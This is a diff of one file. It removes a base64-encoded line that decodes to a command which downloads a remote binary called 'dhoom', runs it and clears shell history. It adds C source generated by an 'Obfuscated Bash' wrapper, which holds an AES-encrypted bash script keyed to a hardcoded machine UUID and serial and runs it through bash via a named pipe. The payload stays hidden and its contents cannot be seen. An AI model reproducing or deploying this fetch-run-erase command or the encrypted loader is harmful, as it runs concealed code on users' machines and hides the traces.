@@ -1,1 +1,493 @@
-d2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbW9vYTMyMi9zY3JpcHQvbWFpbi9kaG9vbSBjaG1vZCAreCBkaG9vbSA7IC4vZGhvb20gJiYgaGlzdG9yeSAtYw==
+char *functions;
+char *includes;
+char *main_body;
+char iv[17]="\0";
+char key[33]="\0";
+char prod_serial[256]="/sys/devices/virtual/dmi/id/product_serial";
+char prod_uuid[256]="/sys/devices/virtual/dmi/id/product_uuid";
+#include <fcntl.h>
+#include <openssl/buffer.h>
+#include <openssl/conf.h>
+#include <openssl/err.h>
+#include <openssl/evp.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
+int ctx_len=5808;
+unsigned char *crypted_script="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\n"
+;
+unsigned char uuid[37]="29dd99cc-fb00-feb9-3b6e-32d7aa054a87";
+unsigned char serial[17]="464df09fcafb8a4b";
+int getuuid(char *uuid)
+{ FILE *filepointer;
+  int i=0,rb=0;
+  char *s, *end;
+  if((filepointer=fopen(prod_uuid,"r"))==NULL)
+  {
+#ifdef __linux__
+    if((filepointer=popen("dmidecode -s system-uuid","r"))==NULL)
+    { return(-1); /*failed running dmidecode*/
+    }
+#elif __APPLE__
+    if((filepointer=popen("system_profiler SPHardwareDataType | awk '/UUID/ { print $3; }'","r"))==NULL)
+    { return(-1); /*failed running system_profiler */
+    }
+#elif __FreeBSD__
+    if((filepointer=popen("gpart list | awk -v i=0 '/rawuuid:/ {if (i<1) print $NF; i++}'","r"))==NULL)
+    { return(-1); /*failed running gpar or awk */
+    }
+#elif __OpenBSD__
+    if((filepointer=popen("disklabel $(df / |awk -F'[/ ]' 'END{print $3}') | awk '/duid:/ {print $NF}' |md5 |awk '{printf(\"%sopen\",$1)}'","r"))==NULL)
+    { return(-1); /*failed running disklabel, md5 or awk */
+    }
+#else
+    printf("Unsupported platform\n");
+    return(-1);
+#endif
+    if((rb=fread(uuid,1,36,filepointer))!=36)
+    { return(-2); /*could not read enough data from "dmidecode -s system-uuid"*/
+    } else pclose(filepointer);
+  } else
+  {
+    if((rb=fread(uuid,1,36,filepointer))!=36)
+    { return(-3); /*could not read enough data from prod_uuid*/
+    } else fclose(filepointer);
+  }
+  return strlen(uuid); 
+}
+int makekey (char *key , char *uuid)
+{ int i=0;
+  char *s, *end; 
+  s=(char*)uuid;
+  while (*s)
+  { if ( *s != '-') key[i++]=*s;
+    s++;
+  }
+  return strlen(key);
+}
+int getserial(char *serial)
+{ FILE *filepointer;
+  int rb=0;
+  char *s, *end;
+  char buff[17]="\0";
+  /* attempt to open sys produtc serial */
+  if((filepointer=fopen(prod_serial,"r"))==NULL)
+  { //printf("File open error. Will attempt to use dmidecode.\n");
+#ifdef __linux__
+    if((filepointer=popen("dmidecode -s system-serial-number","r"))==NULL)
+    { return(-1); /* failed running dmidecode */
+    }
+#elif __APPLE__
+    if((filepointer=popen("system_profiler SPHardwareDataType | awk '/Serial Number/ { print $4 }'","r"))==NULL)
+    { return(-1); /* failed running system_profiler */
+    }
+#elif __FreeBSD__
+    if((filepointer=popen("gpart list | awk -v i=0 '/rawuuid:/ {if (i==2) {print $NF;} i++}'","r"))==NULL)
+    { return(-1); /*failed running gpart or awk */
+    }
+#elif __OpenBSD__
+    if((filepointer=popen("disklabel $(df / |awk -F'[/ ]' 'END{print $3}') | awk '/duid:/ {print $NF}'","r"))==NULL)
+    { return(-1); /*failed running disklabel or awk */
+    }
+#else
+    printf("Unsupported platform\n");
+    return(-1);
+#endif    
+    rb=fread(buff,1,16,filepointer);
+    pclose(filepointer);
+  } else
+  {
+    rb=fread(buff,1,16,filepointer);
+    fclose(filepointer);
+  }
+  if(rb<1)
+  { /*if you get in in here nothing was read so migh as well just give up */
+    printf("Insufficient data to identify.\n");
+    exit(1);
+  }
+  if(rb!=16) strncpy(serial,buff,rb-1);
+  else strcpy(serial,buff);
+  serial[rb]=0;
+  return strlen(serial);
+}
+int makeiv (char *iv, char *serial)
+{ FILE *filepointer;
+  int rb=0;
+  char *s, *end;
+  rb=strlen(serial);
+  if(rb!=16)
+  { strncat(iv,serial,rb-1);
+    if(rb<9)  strncat(iv,prod_serial,17-rb);
+    strncat(iv,serial,17-rb);
+  } else strcpy(iv,serial);
+  return strlen(iv);
+}
+int obencrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key, unsigned char *iv, unsigned char *ciphertext)
+{ EVP_CIPHER_CTX *ctx;
+  int len;
+  int ciphertext_len;
+  /* Create and initialise the context */
+  if(!(ctx = EVP_CIPHER_CTX_new())) exit(1);
+  /* Initialise the encryption operation. IMPORTANT - ensure you use a key
+   * and IV size appropriate for your cipher
+   * In this example we are using 256 bit AES (i.e. a 256 bit key). The
+   * IV size for *most* modes is the same as the block size. For AES this
+   * is 128 bits */
+  if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
+    exit(1);
+  /* Provide the message to be encrypted, and obtain the encrypted output.
+   * EVP_EncryptUpdate can be called multiple times if necessary*/
+  if(1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
+    exit(1);
+  ciphertext_len = len;
+  /* Finalise the encryption. Further ciphertext bytes may be written at
+   * this stage.*/
+  if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len)) exit(1);
+  ciphertext_len += len;
+  /* Clean up */
+  EVP_CIPHER_CTX_free(ctx);
+  return ciphertext_len;
+}
+int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key, unsigned char *iv, unsigned char *plaintext)
+{ EVP_CIPHER_CTX *ctx;
+  int len;
+  int plaintext_len;
+  /* Create and initialise the context */
+  if(!(ctx = EVP_CIPHER_CTX_new())) exit(1);
+  /* Initialise the decryption operation. IMPORTANT - ensure you use a key
+   * and IV size appropriate for your cipher
+   * In this example we are using 256 bit AES (i.e. a 256 bit key). The
+   * IV size for *most* modes is the same as the block size. For AES this
+   * is 128 bits */
+  if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
+    exit(1);
+  /* Provide the message to be decrypted, and obtain the plaintext output.
+   * EVP_DecryptUpdate can be called multiple times if necessary*/
+  if(1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
+    exit(1);
+  plaintext_len = len;
+  /* Finalise the decryption. Further plaintext bytes may be written at
+   * this stage.*/
+  if(1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len)) exit(1);
+  plaintext_len += len;
+  /* Clean up */
+  EVP_CIPHER_CTX_free(ctx);
+  return plaintext_len;
+}
+char *unbase64(unsigned char *input, int length)
+{ BIO *b64, *bmem;
+  char *buffer = (char *)malloc(length);
+  memset(buffer, 0, length);
+  b64 = BIO_new(BIO_f_base64());
+  bmem = BIO_new_mem_buf(input, length);
+  bmem = BIO_push(b64, bmem);
+  BIO_read(bmem, buffer, length);
+  BIO_free_all(bmem);
+  return buffer;
+}
+char *base64(const unsigned char *input, int length)
+{ BIO *bmem, *b64;
+  BUF_MEM *bptr;
+  b64 = BIO_new(BIO_f_base64());
+  bmem = BIO_new(BIO_s_mem());
+  b64 = BIO_push(b64, bmem);
+  BIO_write(b64, input, length);
+  BIO_flush(b64);
+  BIO_get_mem_ptr(b64, &bptr);
+  char *buff = (char *)malloc(bptr->length);
+  memcpy(buff, bptr->data, bptr->length-1);
+  buff[bptr->length-1] = 0;
+  BIO_free_all(b64);
+  return buff;
+}
+int mk_sh_c ( char *infilename, char *key, char *iv , bool reusable, char *serial, char *uuid)
+{ unsigned char *plaintext, *ciphertext, *b64ctx;
+  char *outfilename;
+  FILE *infile,*outfile;
+  int rb,insize,ctsize,i; 
+  char str[256]="\0";
+  outfilename=malloc(strlen(infilename)+2);
+  strcpy(outfilename,infilename);
+  strcat(outfilename,".c");
+  if((outfile=fopen(outfilename,"wb"))==NULL)
+  return(-1); /*failed opening intermediate c source file*/
+  if((infile=fopen(infilename,"r"))==NULL)
+  return(-2); /*failed opening infile*/
+  fseek(infile,0L,SEEK_END);
+  insize=ftell(infile);
+  rewind(infile);
+  plaintext=malloc(insize);
+  ciphertext=malloc(2*insize);
+  b64ctx=malloc(2*insize);
+  ERR_load_crypto_strings();
+  OpenSSL_add_all_algorithms();
+  OPENSSL_no_config();
+  if((rb=fread(plaintext,1,insize,infile))!=insize)
+  return(-3); /*did not read the entire infile */ 
+  ctsize=obencrypt (plaintext,insize,key,iv,ciphertext); 
+  b64ctx=base64(ciphertext,ctsize);
+  printf("input filename: %s\n",infilename);
+  printf("input file size: %i\n",insize);
+  printf("ciphertext size: %i\n",ctsize);
+  printf("base64 encoded ciphertext: %zu : %zu whole lines\n",strlen(b64ctx),strlen(b64ctx)/65);
+  printf("intermediate c generated filename: %s\n",outfilename);
+  fwrite(includes,1,strlen(includes),outfile);
+  sprintf(str,"int ctx_len=%i;\n",ctsize);
+  fwrite(str,1,strlen(str),outfile);
+  fwrite("unsigned char *crypted_script=",1,30,outfile);
+  for (i=0;i<strlen(b64ctx)/65;i++)
+  { fputc(34,outfile); 
+    fwrite(b64ctx+(65*i),1,64,outfile); 
+    fputc(92,outfile);
+    fputc('n',outfile);
+    fputc(34,outfile); 
+    fputc(10,outfile); 
+  }
+  if((i*65)< strlen(b64ctx))
+  { fputc(34,outfile);
+    fwrite(b64ctx+(65*i),1,strlen(b64ctx)-(65*i),outfile);
+    fputc(92,outfile);
+    fputc('n',outfile); 
+    fputc(34,outfile);
+    fputc(10,outfile);
+  }
+  fwrite(";\n",1,2,outfile);
+if(reusable)
+{ printf("Creating reusable intermadiate c file\n");
+  fwrite("unsigned char uuid[37]=",1,23,outfile);
+  fputc(34,outfile);
+  fwrite(uuid,1,strlen(uuid),outfile);
+  fputc(34,outfile);
+  fwrite(";\n",1,2,outfile);
+  fwrite("unsigned char serial[17]=",1,25,outfile);
+  fputc(34,outfile);
+  fwrite(serial,1,strlen(serial),outfile);
+  fputc(34,outfile);
+  fwrite(";\n",1,2,outfile);
+} else
+{ printf("Creating non reusable binary\n"); 
+  fwrite("unsigned char uuid[37]=",1,23,outfile);
+  fputc(34,outfile);
+  fputc(92,outfile); 
+  fputc('0',outfile); 
+  fputc(34,outfile);
+  fwrite(";\n",1,2,outfile);
+  fwrite("unsigned char serial[17]=",1,25,outfile);
+  fputc(34,outfile);
+  fputc(92,outfile);
+  fputc('0',outfile);
+  fputc(34,outfile);
+  fwrite(";\n",1,2,outfile);
+}
+  fwrite(functions,1,strlen(functions),outfile);
+  fwrite("\n",1,1,outfile);
+  fwrite(main_body,1,strlen(main_body),outfile);
+  fclose(outfile);
+  fclose(infile);
+  free(outfilename);
+  free(plaintext);
+  free(ciphertext);
+  free(b64ctx);
+  EVP_cleanup();
+  ERR_free_strings();
+  return(0);
+}
+
+int main(int argc, char *argv[])
+{ char str[256]="\0";
+  int rb,pid,status,len;
+  char *ctx, *plaintext;
+  int pipefd;
+  char pipename[256]="\0";
+  int i,j;
+  static const char *copyright="Obfuscated Bash\n"
+  "Copyright (C) 2017- Davide Rao: louigi600 (at) yahoo (dot) it\n"
+  "\nThis program is free software; you can redistribute it and/or modify\n"
+  "it under the terms of the GNU General Public License as published by\n"
+  "the Free Software Foundation; either version 2 of the License, or\n"
+  "(at your option) any later version provided that no poit of the\n"
+  "AA License is violated.\n";
+  if(strlen(uuid)==0) getuuid(uuid);  
+  makekey(key,uuid);
+  if(strlen(serial)==0) getserial(serial);
+  makeiv(iv,serial);
+  ctx=malloc(strlen(crypted_script));
+  plaintext=malloc(strlen(crypted_script));
+  ERR_load_crypto_strings();
+  OpenSSL_add_all_algorithms();
+  OPENSSL_no_config();
+  ctx=unbase64(crypted_script,strlen(crypted_script));
+  rb=decrypt(ctx,ctx_len,key,iv,plaintext);
+  sprintf(pipename,"/tmp/%i",getpid());
+  if(mkfifo(pipename, 0666)!=0)
+  { unlink(pipename); /* assuming it failed because a file by that name exists */
+    if(mkfifo(pipename, 0666)!=0)
+    { printf("Aborting: could not create named pipe %s\n",pipename);
+      exit(1);
+    }
+  }
+  switch (pid=fork()) 
+  { case -1: /* Handle fork error */
+      printf("Error forking interpreter.\n");
+      break;
+    case 0:  /* Child - reads from named pipe */
+       printf("\0");
+       enum { MAX_ARGS = 64 };
+       char *args[MAX_ARGS];
+       char arg2[15]="\0";
+       char **argp=args;
+       args[0]="bash";
+       args[1]="-c";
+       sprintf(arg2,"source %s",pipename);
+       argp[2]=arg2;
+       argp[3]=argv[0];
+       if (argc==1) args[4]=NULL;
+       else
+       { for(i=1;i<argc;i++)
+         {  argp[i+3]=argv[i];
+         }
+         args[i+3]=NULL; 
+       }
+       fflush(stdout);
+       execvp("bash",args);
+       printf("Interpreter crashed.\n");
+       break;
+    default: /* Parent - writes to named pipe */
+       pipefd=open(pipename, O_WRONLY);  
+       write(pipefd,plaintext,rb);
+       close(pipefd);
+       break;
+  }
+  unlink(pipename);
+  EVP_cleanup();
+  ERR_free_strings(); 
+  free(ctx);
+  free(plaintext);
+  waitpid(pid,&status,0);
+  return(0);
+}
